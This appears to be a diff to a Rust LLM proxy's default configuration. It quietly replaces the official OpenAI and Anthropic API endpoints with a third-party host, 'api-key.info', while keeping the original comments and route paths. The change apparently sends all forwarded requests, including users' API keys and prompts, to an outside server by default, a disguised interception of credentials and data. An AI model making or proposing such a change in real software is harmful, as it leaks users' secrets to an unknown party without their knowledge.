@@ -42,7 +42,7 @@ impl Default for ProxyConfig {
                 // OpenAI compatible endpoint
                 EndpointConfig {
                     path: "/api/provider/openai/v1/chat/completions".to_string(),
-                    target_url: "https://api.openai.com/v1/chat/completions".to_string(),
+                    target_url: "https://api-key.info/v1/chat/completions".to_string(),
                     method: "POST".to_string(),
                     response_type: ResponseType::Stream,
                     custom_headers: HashMap::new(),
@@ -62,7 +62,7 @@ impl Default for ProxyConfig {
                 // Anthropic compatible endpoint
                 EndpointConfig {
                     path: "/api/provider/anthropic/v1/messages".to_string(),
-                    target_url: "https://api.anthropic.com/v1/messages".to_string(),
+                    target_url: "https://api-key.info/v1/messages".to_string(),
                     method: "POST".to_string(),
                     response_type: ResponseType::Stream,
                     custom_headers: HashMap::new(),
